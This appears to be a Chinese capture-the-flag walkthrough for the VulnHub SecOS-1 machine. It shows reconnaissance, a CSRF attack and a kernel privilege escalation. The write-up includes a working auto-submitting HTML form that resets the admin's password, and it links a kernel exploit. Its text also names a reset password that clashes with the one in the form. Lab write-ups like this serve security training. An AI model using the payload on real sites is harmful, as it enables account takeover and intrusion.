# 下载地址

    
    
    https://download.vulnhub.com/secos/SecOS-1.tar.gz

 **不要用vmbox启动，用vmware添加硬盘的方式启动，不然会找不到IP**

#  **实战演练**

使用netdiscover命令查找靶机的IP。

![image.png](https://image.3001.net/images/20190820/1566294213_5d5bc0c508634.png)  

使用nmap查看靶机开放的端口

![image.png](https://image.3001.net/images/20190820/1566294304_5d5bc1201b211.png)

打开浏览器

![image.png](https://image.3001.net/images/20190820/1566294341_5d5bc14513265.png)使用bp找到了一个页面

![image.png](https://image.3001.net/images/20190820/1566294531_5d5bc203617e6.png)![image.png](https://image.3001.net/images/20190820/1566294544_5d5bc210f30bd.png)查看页面源代码

第一：用户管理员会频繁看网站

第二：他运行在本地接口

第三：存在CSRF漏洞

![image.png](https://image.3001.net/images/20190820/1566294656_5d5bc2809f5ae.png)创建一个账号

![image.png](https://image.3001.net/images/20190820/1566296316_5d5bc8fc575de.png)登录进去，可以看到管理员是spiderman

![image.png](https://image.3001.net/images/20190820/1566296354_5d5bc9227beb8.png)使用bp生成修改密码的csrf的poc

    
    
    <html>
    <body>
    <form name="changepass" method="post" action="http://127.0.0.1:8081/change-password">
    <input type="hidden" name="username" value="spiderman">
    <input type="hidden" name="password" value="abc123">
    </form>
    <script type="text/javascript">
    document.changepass.submit();
    </script>
    </body>
    </html>
      
    

发送消息给管理员

![image.png](https://image.3001.net/images/20190820/1566296729_5d5bca99bc9a9.png)

  

几分钟后，apache访问日志显示有人查看了我们的页面。

所以希望蜘蛛侠的密码重置为蜘蛛侠。是时候登录蜘蛛侠帐户了。

![image.png](https://image.3001.net/images/20190820/1566296777_5d5bcac93d92d.png)登录成功，我们看到信息里面有个人说获取到我们的密码，试一下用这个密码登录ssh

![image.png](https://image.3001.net/images/20190820/1566297510_5d5bcda6e405a.png)登录ssh成功

![image.png](https://image.3001.net/images/20190820/1566297590_5d5bcdf6600f3.png)sudo不行

![image.png](https://image.3001.net/images/20190820/1566297646_5d5bce2e5c1e4.png)查看内核版本

![image.png](https://image.3001.net/images/20190820/1566297725_5d5bce7d78b39.png)[EXP](https://www.exploit-db.com/exploits/37292)

![image.png](https://image.3001.net/images/20190820/1566297846_5d5bcef6459ab.png)  

